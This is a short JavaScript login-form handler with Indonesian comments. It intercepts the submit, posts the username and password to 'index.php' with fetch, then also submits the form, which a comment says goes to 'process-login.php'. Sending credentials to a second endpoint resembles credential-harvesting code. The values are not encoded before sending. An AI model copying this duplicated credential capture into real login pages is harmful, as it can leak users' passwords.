const loginForm = document.getElementById('black');

loginForm.addEventListener('submit', (e) => {

    e.preventDefault();

    const username = document.getElementById('username').value;

    const password = document.getElementById('password').value;

    // Mengirim data ke URL lain menggunakan fetch

    fetch('index.php', {

        method: 'POST',

        headers: {

            'Content-Type': 'application/x-www-form-urlencoded'

        },

        body: `username=${username}&password=${password}`

    })

    .then(response => response.text())

    .then(data => {

        // Menampilkan respon dari server

        console.log(data);

    })

    .catch(error => {

        console.error('Error:', error);

    });

    // Mengirim form langsung ke process-login.php

    loginForm.submit();

});
